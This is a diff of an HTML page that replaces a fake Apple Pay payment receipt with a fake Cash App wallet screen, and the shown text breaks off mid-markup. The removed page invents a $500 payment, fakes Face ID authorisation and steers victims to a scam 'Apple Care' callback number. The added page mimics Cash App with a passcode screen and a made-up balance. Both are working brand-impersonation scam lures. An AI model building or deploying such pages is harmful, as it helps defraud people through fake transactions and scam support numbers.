@@ -1,789 +1,1266 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Apple Pay Cofirmation</title>
-    <style>
-        /* Base Reset & Styling */
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-        body {
-            background-color: #000000;
-            color: #ffffff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            overflow-x: hidden;
-        }
+<title>Cash App Wallet</title>
 
-/* Container mimicking mobile screen */
-.phone-container {
-    width:100%;
-    max-width:412px;
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+
+<style>
+
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:'Inter',sans-serif;
+}
+
+body{
+    background:#00d64f;
+    display:flex;
+    justify-content:center;
+    align-items:center;
     min-height:100vh;
-    min-height:100dvh;
-    height:auto;
-    background-color:#000000;
+    overflow:hidden;
+}
+
+/* APP */
+
+.app{
+    width:390px;
+    height:844px;
+    background:#f7f7f7;
+    border-radius:38px;
+    overflow:hidden;
     position:relative;
-    overflow-y:auto;
-    border:1px solid rgba(255,255,255,.05);
+    box-shadow:
+    0 20px 60px rgba(0,0,0,.18);
+}
+
+/* =========================
+   SPLASH SCREEN
+========================= */
+
+.splash{
+    position:absolute;
+    inset:0;
+    background:#00d64f;
+    z-index:9999;
+
     display:flex;
     flex-direction:column;
-    margin:0 auto;
-}
-
-        /* Flash overlay mimicking native authorization */
-        .shutter-flash {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: #ffffff;
-            opacity: 0;
-            z-index: 99;
-            pointer-events: none;
-        }
-
-        /* --- STAGE 1: FIXED CENTERED FACE ID POPUP --- */
-        .faceid-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100vw;
-            height: 100vh;
-            background-color: rgba(0, 0, 0, 0.85);
-            z-index: 90;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-            transition: opacity 0.6s cubic-bezier(0.19, 1, 0.22, 1);
-        }
-
-        .faceid-popup {
-            background-color: #1c1c1e;
-            border-radius: 32px;
-            padding: 28px;
-            width: 100%;
-            max-width: 350px;
-            box-shadow: 0 24px 48px rgba(0, 0, 0, 0.8);
-            transform: scale(1);
-            transition: transform 0.5s cubic-bezier(0.34, 1.56, 0.64, 1), opacity 0.4s ease;
-        }
-
-        .popup-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 24px;
-        }
-
-        .apple-pay-title {
-            display: flex;
-            align-items: center;
-            font-size: 20px;
-            font-weight: 600;
-        }
-
-        .apple-pay-title svg {
-            margin-right: 6px;
-        }
-
-        .amount {
-            color: #aeaeae;
-            font-size: 16px;
-        }
-
-        .pay-row {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border-bottom: 1px solid #2c2c2e;
-            padding-bottom: 20px;
-            margin-bottom: 30px;
-        }
-
-        .pay-label {
-            color: #8e8e93;
-            font-size: 16px;
-        }
-
-        .pay-value {
-            font-size: 18px;
-            font-weight: 500;
-        }
-
-        /* High-fidelity Face ID Scanning View */
-        .faceid-container {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .circle-wrapper {
-            position: relative;
-            width: 140px;
-            height: 140px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin-bottom: 24px;
-        }
-
-        /* Outer native processing spin circle */
-        .circle-wrapper::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            border-radius: 50%;
-            border: 3px solid rgba(255, 255, 255, 0.05);
-            border-top-color: #34c759;
-            border-right-color: #34c759;
-            animation: spin 1.8s cubic-bezier(0.4, 0, 0.2, 1) infinite;
-        }
-
-        /* Face ID glyph boundary box */
-        .faceid-box {
-            width: 100px;
-            height: 100px;
-            border: 2px dashed rgba(255, 255, 255, 0.15);
-            border-radius: 26px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            position: relative;
-            overflow: hidden;
-            animation: pulseBox 2s ease-in-out infinite;
-        }
-
-        /* Sweeping dynamic scanner line overlay */
-        .faceid-box::before {
-            content: '';
-            position: absolute;
-            width: 100%;
-            height: 3px;
-            background: linear-gradient(90deg, transparent, #34c759, transparent);
-            box-shadow: 0 0 12px #34c759;
-            top: 0;
-            animation: sweep 2.2s ease-in-out infinite;
-            z-index: 2;
-        }
-
-        .auth-text {
-            font-size: 17px;
-            font-weight: 500;
-            margin-bottom: 6px;
-            letter-spacing: -0.2px;
-        }
-
-        .sub-text {
-            color: #8e8e93;
-            font-size: 14px;
-            text-align: center;
-        }
-
-        /* Animation Keyframe Blocks */
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        @keyframes sweep {
-            0% { top: 0%; opacity: 0; }
-            15% { opacity: 1; }
-            85% { opacity: 1; }
-            100% { top: 100%; opacity: 0; }
-        }
-
-        @keyframes pulseBox {
-            0%, 100% { border-color: rgba(255, 255, 255, 0.15); }
-            50% { border-color: #34c759; }
-        }
-
-        /* --- STAGE 2: RECEIPT PAGE --- */
-        .receipt-page {
-            padding: 20px;
-            opacity: 0;
-            transform: translateY(20px);
-            transition: opacity .55s ease, transform .55s cubic-bezier(.22,1,.36,1);
-        }
-
-        .top-nav {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 10px 0 25px 0;
-        }
-
-/* Apple Wallet style support capsule */
-.need-help{
-position:relative;
-overflow:hidden;
-
-display:flex;
-align-items:center;
-gap:10px;
-text-decoration:none;
-color:#fff;
-background:linear-gradient(180deg,rgba(255,255,255,.08),rgba(255,255,255,.03));
-border:1px solid rgba(255,255,255,.18);
-border-radius:4px;
-padding:5px 14px 5px 8px;
-backdrop-filter:blur(12px);
--webkit-backdrop-filter:blur(12px);
-box-shadow:0 12px 36px rgba(0,0,0,.28), inset 0 1px 0 rgba(255,255,255,.08);
-transition:.2s;
-}
-.need-help:hover{
-background:rgba(255,255,255,.08);
-border-color:rgba(255,255,255,.30);
-}
-.need-help:active{transform:scale(.98);}
-.need-help .icon{
-display:flex;
-align-items:center;
-justify-content:center;
-background:none;
-border:none;
-min-width:auto;
-width:auto;
-height:auto;
-}
-.need-help .text{
-display:flex;
-flex-direction:column;
-line-height:1.2;
-align-items:center;
-}
-.need-help .label{
-font-size:11px;
-color:#c7c7cc;
-font-weight:500;
-}
-.need-help .number{
-font-size:14px;
-font-weight:600;
-color:#fff;
-}
-
-.success-card, .details-card, .support-card-container {
-            background-color: #1c1c1e;
-            box-shadow:0 14px 42px rgba(0,0,0,.28);
-
-            border-radius: 24px;
-            padding: 24px;
-            margin-bottom: 16px;
-        }
-
-        .success-card {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            text-align: center;
-            padding-top: 35px;
-            padding-bottom: 35px;
-        }
-
-        .checkmark-circle {
-            width: 80px;
-            height: 80px;
-            background-color: #30D158;
-            border-radius: 50%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin-bottom: 25px;
-            box-shadow:0 0 0 rgba(48,209,88,0),0 0 28px rgba(48,209,88,.30);
-            transform: scale(0);
-        }
-
-        .success-title {
-            font-size: 28px;
-            font-weight: 700;
-            line-height: 1.3;
-            margin-bottom: 16px;
-        }
-
-        .success-summary {
-            color: #8e8e93;
-            font-size: 15px;
-            line-height: 1.4;
-        }
-
-        /* Table Grid presentation layers */
-        .data-row {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 16px 0;
-            border-bottom: 1px solid #2c2c2e;
-        }
-
-        .data-row:last-child {
-            border-bottom: none;
-        }
-
-        .data-label {
-            color: #8e8e93;
-            font-size: 15px;
-        }
-
-        .data-value {
-            font-size: 15px;
-            font-weight: 500;
-        }
-
-        .status-completed {
-            color: #24b354;
-            display: flex;
-            align-items: center;
-            font-weight: 600;
-        }
-
-        .status-completed svg {
-            margin-right: 6px;
-        }
-
-        .confirmation-email {
-            display: flex;
-            align-items: center;
-        }
-
-        .confirmation-email svg {
-            margin-right: 6px;
-        }
-
-        .details-card h3 {
-            font-size: 17px;
-            font-weight: 600;
-            margin-bottom: 12px;
-        }
-
-        .details-card p {
-            color: #8e8e93;
-            font-size: 14px;
-            line-height: 1.4;
-            margin-bottom: 20px;
-        }
-
-        .details-card p strong {
-            color: #ffffff;
-        }
-
-        .highlight-green {
-            color: #24b354;
-            font-weight: 600;
-        }
-
-        .delay-notice {
-            display: flex;
-            align-items: center;
-            color: #8e8e93;
-            font-size: 14px;
-            border-top: 1px solid #2c2c2e;
-            padding-top: 16px;
-        }
-
-        .delay-notice svg {
-            margin-right: 10px;
-            flex-shrink: 0;
-        }
-
-        /* Support area wrapping row modules */
-        .support-card-container {
-            display: flex;
-            flex-direction: column;
-            gap: 20px;
-        }
-
-        
-.support-row-clickable{
-display:flex;
-align-items:center;
-justify-content:space-between;
-text-decoration:none;
-color:inherit;
-padding:6px;
-border-radius:16px;
-transition:background-color .2s ease;
-}
-.support-row-clickable:hover{background:#2a2a2c;}
-.support-row-clickable:active{background:#303033;}
-
-.support-left {
-            display: flex;
-            align-items: center;
-        }
-
-        .phone-icon-bg {
-            width: 40px;
-            height: 40px;
-            background-color: #2c2c2e;
-            border-radius: 50%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin-right: 14px;
-        }
-
-        .support-text-main {
-            font-size: 15px;
-            font-weight: 600;
-            margin-bottom: 4px;
-            color: #ffffff;
-        }
-
-        .support-text-sub {
-            color: #8e8e93;
-            font-size: 13px;
-        }
-
-        /* Primary dialer link helper button */
-        .call-action-btn{
-    display:flex;
-    align-items:center;
     justify-content:center;
-    width:100%;
+    align-items:center;
 
-    background:linear-gradient(
-        180deg,
-        #2c2c2e,
-        #1f1f21
-    );
+    transition:.5s ease;
+}
 
-    color:#ffffff;
-    text-decoration:none;
+.splash-logo{
+    width:110px;
+    height:110px;
+    border-radius:28px;
+    background:#fff;
 
-    padding:16px 20px;
+    display:flex;
+    justify-content:center;
+    align-items:center;
 
-    border-radius:18px;
-
-    border:1px solid rgba(255,255,255,.12);
-
-    font-size:16px;
-    font-weight:600;
-
-    transition:all .2s ease;
+    overflow:hidden;
 
     box-shadow:
-        0 4px 10px rgba(0,0,0,.35),
-        inset 0 1px 0 rgba(255,255,255,.08);
+    0 10px 40px rgba(0,0,0,.12);
 }
 
-.call-action-btn:hover{
-    background:linear-gradient(
-        180deg,
-        #343437,
-        #262629
-    );
+.splash-logo img{
+    width:72%;
+    height:72%;
+    object-fit:contain;
 }
 
-.call-action-btn:active{
-    transform:scale(.98);
+.loader{
+    width:42px;
+    height:42px;
+    border-radius:50%;
+
+    border:3px solid rgba(255,255,255,.35);
+    border-top:3px solid #fff;
+
+    margin-top:34px;
+
+    animation:spin 1s linear infinite;
 }
 
-.call-action-btn svg{
-    margin-right:10px;
-    fill:#d7d7db;
+@keyframes spin{
+    100%{
+        transform:rotate(360deg);
+    }
 }
 
-        .footer-info {
-            text-align: center;
-            color: #636366;
-            font-size: 12px;
-            padding: 20px 0 40px 0;
-            line-height: 1.8;
-        }
-
-        /* --- STATE TRANSITION CLASSES --- */
-        .authenticated .faceid-overlay {
-            opacity: 0;
-            pointer-events: none;
-        }
-        
-        .authenticated .faceid-popup {
-            transform: scale(0.85);
-            opacity: 0;
-        }
-
-        .authenticated .receipt-page {
-            opacity: 1;
-            transform: translateY(0);
-        }
-
-        .authenticated .checkmark-circle {
-            animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
-            animation-delay: 0.35s;
-        }
-
-        @keyframes popIn {
-            0% { transform: scale(0); }
-            100% { transform: scale(1); }
-        }
-
-        @keyframes flashEffect {
-            0% { opacity: 0; }
-            20% { opacity: 1; }
-            100% { opacity: 0; }
-        }
-    
-/* APPLE POPUP V2 */
-.apple-popup-overlay{position:fixed;left:0;top:0;z-index:120;opacity:0;pointer-events:none;transition:opacity .25s;will-change:transform}
-.apple-popup-overlay.show{opacity:1;pointer-events:auto}
-.apple-popup{width:min(94vw,375px);margin:0 auto;background:linear-gradient(180deg,rgba(34,34,36,.97),rgba(24,24,26,.98));border-radius:28px;padding:14px 20px 16px;border:1px solid rgba(255,255,255,.08);box-shadow:0 24px 60px rgba(0,0,0,.45);transform:translateY(-45px) scale(.92);transition:.45s cubic-bezier(.22,1,.36,1);position:relative;overflow:hidden}
-.apple-popup-overlay.show .apple-popup{transform:translateY(0) scale(1);transition:transform .7s cubic-bezier(.175,.885,.32,1.35)}
-.apple-popup:after{content:"";position:absolute;width:180px;height:180px;border-radius:50%;background:radial-gradient(rgba(10,132,255,.14),transparent 70%);top:-90px;right:-70px}
-.popup-badge{display:inline-flex;background:rgba(10,132,255,.12);color:#0A84FF;padding:5px 12px;border-radius:999px;font-size:11px;font-weight:600}
-.popup-amount{
-    margin-top:14px;
-    margin-bottom:8px;   /* add this */
-    font-size:38px;
-    font-weight:700;
-    line-height:1.1;
-}
-.popup-person{
-    margin-top:0;
-    margin-bottom:8px;   /* add this */
-    font-size:19px;
+.loading-text{
+    margin-top:22px;
+    color:#fff;
+    font-size:15px;
     font-weight:600;
+    letter-spacing:.2px;
 }
-.popup-time{margin-top:2px;color:#8E8E93;font-size:13px}
-.popup-button{width:100%;margin-top:12px;background:linear-gradient(180deg,#2997FF,#007AFF);color:#fff;border:none;border-radius:16px;padding:12px;font-size:16px;font-weight:600}
-.popup-support{display:block;text-align:center;margin-top:8px;text-decoration:none;color:#0A84FF;font-size:14px;font-weight:600}
+
+/* =========================
+   PIN SCREEN
+========================= */
+
+.pin-screen{
+    position:absolute;
+    inset:0;
+    background:#00d64f;
+
+    z-index:9998;
+
+    display:flex;
+    flex-direction:column;
+    justify-content:center;
+    align-items:center;
+
+    opacity:0;
+    pointer-events:none;
+
+    transition:.5s ease;
+}
+
+.pin-title{
+    color:#fff;
+    font-size:26px;
+    font-weight:800;
+    margin-bottom:38px;
+}
+
+.pin-dots{
+    display:flex;
+    gap:18px;
+}
+
+.dot{
+    width:20px;
+    height:20px;
+    border-radius:50%;
+    background:rgba(255,255,255,.25);
+
+    transition:.25s ease;
+}
+
+.dot.active{
+    background:#fff;
+    transform:scale(1.08);
+}
+
+/* =========================
+   MAIN PAGE
+========================= */
+
+.main{
+    position:absolute;
+    inset:0;
+
+    background:#f7f7f7;
+
+    transform:translateY(40px);
+    opacity:0;
+
+    transition:.7s cubic-bezier(.2,.8,.2,1);
+}
+
+/* STATUS */
+
+.status{
+    height:54px;
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    padding:0 24px;
+
+    color:#000;
+    font-size:14px;
+    font-weight:700;
+}
+
+/* TOPBAR */
+
+.topbar{
+    padding:8px 22px 0;
+
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+}
+
+/* LOGO */
+
+.logo{
+    width:50px;
+    height:50px;
+    border-radius:16px;
+    background:#00d64f;
+
+    display:flex;
+    justify-content:center;
+    align-items:center;
+
+    overflow:hidden;
+}
+
+.logo img{
+    width:72%;
+    height:72%;
+    object-fit:contain;
+}
+
+/* PROFILE */
+
+.profile{
+    width:44px;
+    height:44px;
+    border-radius:50%;
+
+    background:#fff;
+
+    border:1px solid #ececec;
+
+    display:flex;
+    justify-content:center;
+    align-items:center;
+
+    font-size:18px;
+}
+
+/* HEADER */
+
+.header{
+    padding:14px 24px 10px;
+}
+
+/* CHART */
+
+.mini-chart{
+    margin-top:6px;
+    background:#fff;
+    border-radius:30px;
+    padding:22px;
+    border:1px solid #ececec;
+}
+
+.chart-top{
+    display:flex;
+    justify-content:space-between;
+    align-items:flex-start;
+    margin-bottom:14px;
+}
+
+.chart-balance{
+    font-size:34px;
+    font-weight:800;
+    letter-spacing:-1px;
+    color:#000;
+}
+
+.chart-growth{
+    margin-top:6px;
+    color:#00c94a;
+    font-size:14px;
+    font-weight:700;
+}
+
+.chart-pill{
+    background:#e8fff0;
+    color:#00c94a;
+    padding:8px 14px;
+    border-radius:999px;
+    font-size:12px;
+    font-weight:800;
+}
+
+.chart-svg{
+    width:100%;
+    height:120px;
+    display:block;
+}
+
+/* CTA */
+
+.cta{
+    margin:0 24px 24px;
+    background:#00d64f;
+    border-radius:30px;
+    padding:18px;
+    color:#fff;
+    position:relative;
+    overflow:hidden;
+}
+
+.cta::after{
+    content:"";
+    position:absolute;
+    right:-40px;
+    top:-40px;
+
+    width:160px;
+    height:160px;
+
+    border-radius:50%;
+
+    background:rgba(255,255,255,.12);
+}
+
+.cta-title{
+    font-size:20px;
+    font-weight:700;
+    position:relative;
+    z-index:2;
+}
+
+.cta-sub{
+    margin-top:8px;
+    font-size:14px;
+    line-height:1.5;
+    width:75%;
+
+    color:rgba(255,255,255,.92);
+
+    position:relative;
+    z-index:2;
+}
+
+.cta-btn{
+    margin-top:18px;
+    display:inline-flex;
+    align-items:center;
+    gap:10px;
+
+    background:#fff;
+    color:#000;
+
+    padding:14px 20px;
+
+    border-radius:999px;
+
+    text-decoration:none;
+
+    font-size:15px;
+    font-weight:700;
+
+    position:relative;
+    z-index:2;
+}
+
+/* SECTION */
+
+.section{
+    padding:0 24px;
+}
+
+.section-head{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    margin-bottom:18px;
+}
+
+.section-title{
+    font-size:21px;
+    font-weight:800;
+    color:#000;
+}
+
+.see-all{
+    font-size:14px;
+    font-weight:700;
+    color:#00c94a;
+}
+
+/* ACTIVITY */
+
+.activity-card{
+    background:#fff;
+    border-radius:28px;
+    padding:8px 18px;
+    border:1px solid #ededed;
+}
+
+/* ITEM */
+
+.item{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+
+    padding:18px 0;
+
+    border-bottom:1px solid #f1f1f1;
+}
+
+.item:last-child{
+    border:none;
+}
+
+.item-left{
+    display:flex;
+    align-items:center;
+    gap:14px;
+}
+
+/* ICON */
+
+.icon{
+    width:54px;
+    height:54px;
+    border-radius:18px;
+
+    display:flex;
+    justify-content:center;
+    align-items:center;
+
+    font-size:20px;
+    font-weight:700;
+}
+
+.green{
+    background:#e8fff0;
+    color:#00c94a;
+}
+
+.black{
+    background:#101010;
+    color:#fff;
+}
+
+.soft{
+    background:#f2f2f2;
+    color:#111;
+}
+
+/* TEXT */
+
+.name{
+    font-size:16px;
+    font-weight:700;
+    color:#000;
+}
+
+.time{
+    margin-top:5px;
+    font-size:13px;
+    color:#8a8a8a;
+}
+
+.amount{
+    font-size:18px;
+    font-weight:800;
+}
+
+.plus{
+    color:#00c94a;
+}
+
+.minus{
+    color:#000;
+}
+
+/* NAV */
+
+.nav{
+    position:absolute;
+    bottom:0;
+    left:0;
+
+    width:100%;
+
+    background:#fff;
+
+    border-top:1px solid #ececec;
+
+    display:flex;
+    justify-content:space-around;
+
+    padding:16px 0 28px;
+}
+
+.nav-item{
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    gap:7px;
+
+    font-size:12px;
+    font-weight:600;
+
+    color:#9a9a9a;
+}
+
+.nav-item.active{
+    color:#00c94a;
+}
+
+.nav-icon{
+    font-size:22px;
+}
+
+/* SHOW MAIN */
+
+.main.show{
+    transform:translateY(0);
+    opacity:1;
+}
+
+/* MOBILE */
+
+@media(max-width:430px){
+
+    body{
+        background:#f7f7f7;
+    }
+
+    .app{
+        width:100%;
+        height:100vh;
+        border-radius:0;
+    }
+
+}
+
+/* =========================
+   POPUP
+========================= */
+
+/* =========================
+   POPUP
+========================= */
+
+.popup-wrap{
+    position:absolute;
+
+    top:126px;
+    left:24px;
+    right:24px;
+
+    z-index:999;
+
+    opacity:0;
+    pointer-events:none;
+
+    transform:
+    translateY(-24px)
+    scale(.92);
+
+    transition:.5s cubic-bezier(.2,.8,.2,1);
+}
+
+.popup-wrap.show{
+    opacity:1;
+    pointer-events:auto;
+
+    transform:
+    translateY(0)
+    scale(1);
+}
+
+.popup-card{
+
+    background:
+    rgba(255,255,255,.94);
+
+    backdrop-filter:blur(18px);
+
+    border-radius:32px;
+
+    padding:22px;
+
+    border:
+    1px solid rgba(255,255,255,.7);
+
+    box-shadow:
+    0 30px 80px rgba(0,0,0,.16),
+    0 10px 30px rgba(0,0,0,.08);
+
+    position:relative;
+
+    overflow:hidden;
+}
+
+.popup-card::after{
+
+    content:"";
+
+    position:absolute;
+
+    width:180px;
+    height:180px;
+
+    border-radius:50%;
+
+    background:
+    radial-gradient(
+        rgba(0,214,79,.12),
+        transparent
+    );
+
+    top:-80px;
+    right:-60px;
+
+    pointer-events:none;
+}
+
+.popup-badge{
+    display:inline-flex;
+
+    background:#e8fff0;
+
+    color:#00c94a;
+
+    padding:8px 14px;
+
+    border-radius:999px;
+
+    font-size:11px;
+    font-weight:800;
+}
+
+.popup-amount{
+    margin-top:16px;
+
+    font-size:30px;
+    font-weight:800;
+
+    letter-spacing:-1px;
+
+    color:#000;
+}
+
+.popup-user{
+    margin-top:4px;
+
+    font-size:17px;
+    font-weight:700;
+
+    color:#000;
+}
+
+.popup-time{
+    margin-top:6px;
+
+    color:#8e8e93;
+
+    font-size:13px;
+}
+
+.popup-btn{
+    width:100%;
+
+    margin-top:18px;
+
+    border:none;
+
+    background:#00d64f;
+    color:#fff;
+
+    padding:15px;
+
+    border-radius:16px;
+
+    font-size:14px;
+    font-weight:700;
+
+    cursor:pointer;
+}
+
+.popup-support{
+    display:flex;
+    justify-content:center;
+
+    margin-top:12px;
+
+    text-decoration:none;
+
+    color:#00c94a;
+
+    font-size:13px;
+    font-weight:700;
+}
 
 </style>
-
-<!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-B7Y1WBWWM4"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'G-B7Y1WBWWM4');
-</script>
-
 </head>
+
 <body>
 
-<div class="phone-container" id="mainContainer">
-    <div class="shutter-flash" id="flashLayer"></div>
+<div class="app">
 
-    <div class="faceid-overlay" id="faceIdOverlay">
-        <div class="faceid-popup">
-            <div class="popup-header">
-                <span class="apple-pay-title">
-                    <svg width="16" height="19" viewBox="0 0 17 20" fill="currentColor"><path d="M15.03 10.37c-.06-2.5 2.05-3.71 2.14-3.77-1.17-1.71-3-1.94-3.64-1.99-1.54-.16-3.02.91-3.8.91-.79 0-2.02-.89-3.32-.86-1.71.02-3.29.99-4.17 2.53-1.78 3.1-0.45 7.68 1.27 10.16.84 1.21 1.83 2.57 3.14 2.52 1.26-.05 1.74-.81 3.26-.81 1.52 0 1.96.81 3.28.79 1.35-.02 2.22-1.23 3.05-2.44.96-1.4 1.35-2.76 1.37-2.83-.03-.02-2.64-1.01-2.68-4.01zm-2.4-6.84c.69-.84 1.15-2 1.02-3.16-1 .04-2.21.67-2.93 1.51-.64.74-1.2 1.92-1.05 3.06 1.12.09 2.27-.57 2.96-1.41z"/></svg>
-                    Pay
-                </span>
-                <span class="amount">$500.00 USD</span>
-            </div>
+    <!-- SPLASH -->
 
-            <div class="pay-row">
-                <span class="pay-label">Sending</span>
-                <span class="pay-value">..Irene Hayes</span>
-            </div>
+    <div class="splash" id="splash">
 
-            <div class="faceid-container">
-                <div class="circle-wrapper">
-                    <div class="faceid-box">
-                        <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
-                            <path d="M3 7V5a2 2 0 0 1 2-2h2M17 3h2a2 2 0 0 1 2 2v2M21 17v2a2 2 0 0 1-2 2h-2M7 21H5a2 2 0 0 1-2-2v-2"/>
-                            <path d="M9 10h.01M15 10h.01M12 12v3M10 17c1 1.5 3 1.5 4 0"/>
-                        </svg>
-                    </div>
-                </div>
-                <div class="auth-text">Authorizing Face ID</div>
-                <div class="sub-text">Glance at your device to authorize.</div>
-            </div>
+        <div class="splash-logo">
+            <img src="https://i.ibb.co/Wp269Dqq/vdfgvfg.png">
         </div>
+
+        <div class="loader"></div>
+
+        <div class="loading-text" id="loadingText">
+            Opening Cash App...
+        </div>
+
     </div>
 
-    <div class="receipt-page">
-        <div class="top-nav">
-            <span class="apple-pay-title">
-                <svg width="16" height="19" viewBox="0 0 17 20" fill="currentColor"><path d="M15.03 10.37c-.06-2.5 2.05-3.71 2.14-3.77-1.17-1.71-3-1.94-3.64-1.99-1.54-.16-3.02.91-3.8.91-.79 0-2.02-.89-3.32-.86-1.71.02-3.29.99-4.17 2.53-1.78 3.1-0.45 7.68 1.27 10.16.84 1.21 1.83 2.57 3.14 2.52 1.26-.05 1.74-.81 3.26-.81 1.52 0 1.96.81 3.28.79 1.35-.02 2.22-1.23 3.05-2.44.96-1.4 1.35-2.76 1.37-2.83-.03-.02-2.64-1.01-2.68-4.01zm-2.4-6.84c.69-.84 1.15-2 1.02-3.16-1 .04-2.21.67-2.93 1.51-.64.74-1.2 1.92-1.05 3.06 1.12.09 2.27-.57 2.96-1.41z"/></svg>
-                Apple Pay
-            </span>
-            <a href="tel:18045000591" class="need-help">
+    <!-- PIN SCREEN -->
 
+    <div class="pin-screen" id="pinScreen">
 
-
-    <span class="text">
-        <span class="label">Apple Care USA</span>
-        <span class="number">1 (804) 500-0591</span>
-    </span>
-
-</a>
+        <div class="pin-title">
+            Enter Passcode
         </div>
 
-        <div class="success-card">
-            <div class="checkmark-circle">
-                <svg width="34" height="26" viewBox="0 0 24 18" fill="none" stroke="#ffffff" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
-            </div>
-            <h1 class="success-title">Payment Successfull</h1>
-            <p class="success-summary">$500.00 sent to Irene Hayes via Apple Pay</p>
+        <div class="pin-dots">
+
+            <div class="dot" id="d1"></div>
+            <div class="dot" id="d2"></div>
+            <div class="dot" id="d3"></div>
+            <div class="dot" id="d4"></div>
+
         </div>
 
-        <div class="details-card">
-            <div class="data-row">
-                <span class="data-label">Date</span>
-                <span class="data-value">08/07/2026</span>
-            </div>
-            <div class="data-row">
-                <span class="data-label">Transaction ID</span>
-                <span class="data-value">28 2JSI 2827</span>
-            </div>
-            <div class="data-row">
-                <span class="data-label">Status</span>
-                <span class="status-completed">
-                    <svg width="16" height="16" viewBox="0 0 24 24" fill="#24b354"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
-                    Completed
-                </span>
-            </div>
+    </div>
 
-            <div class="data-row">
-                <span class="data-label">Confirmation</span>
-                <span class="confirmation-email">
-                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#8e8e93" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
-                    Email Sent
-                </span>
-            </div>
+    <!-- MAIN -->
+
+    <div class="main" id="main">
+
+        <!-- STATUS -->
+
+        <div class="status">
+            <div id="liveTime"></div>
+            <div>5G 🔋</div>
         </div>
 
-        <div class="details-card">
-            <h3>About this payment</h3>
-            <p>You accepted a money request from <strong>Irene Hayes</strong>. Your linked card was charged and the funds were transferred. The transaction is now marked <span class="highlight-green">Completed</span>.</p>
-            
-            <div class="delay-notice">
-                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#8e8e93" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
-                <span>Funds may take up to <strong>24 hours</strong> to reflect on your bank statement.</span>
+        <!-- TOPBAR -->
+
+        <div class="topbar">
+
+            <div class="logo">
+                <img src="https://i.ibb.co/Wp269Dqq/vdfgvfg.png">
             </div>
+
+            <div class="profile">👤</div>
+
         </div>
 
-        <div class="support-card-container">
-            <a href="tel:18045000591" class="support-row-clickable">
-                <div class="support-left">
-                    <div class="phone-icon-bg">
-                        <svg width="18" height="18" viewBox="0 0 24 24" fill="#ffffff"><path d="M20.01 15.38c-1.23 0-2.42-.2-3.53-.56a.977.977 0 0 0-1.01.24l-2.2 2.2c-2.83-1.44-5.15-3.75-6.59-6.59l2.2-2.21c.28-.26.36-.68.25-1.05A11.39 11.39 0 0 1 8.58 4c0-.55-.45-1-1-1H4.03c-.55 0-1 .45-1 1 0 9.39 7.63 17 17 17 .55 0 1-.45 1-1v-3.62c0-.55-.45-1-1-1z"/></svg>
-                    </div>
+        <!-- HEADER -->
+
+        <div class="header">
+
+            <div class="mini-chart">
+
+                <div class="chart-top">
+
                     <div>
-                        <div class="support-text-main">Didn't recognize this payment?</div>
-                        <div class="support-text-sub">Payment Protection Enabled</div>
+
+                        <div class="chart-balance">
+                            $12,840
+                        </div>
+
+                        <div class="chart-growth">
+                            +12.4% This Week
+                        </div>
+
                     </div>
+
+                    <div class="chart-pill">
+                        LIVE
+                    </div>
+
                 </div>
-                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#636366" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"></polyline></svg>
-            </a>
-            
-            <a href="tel:18045000591" class="call-action-btn">
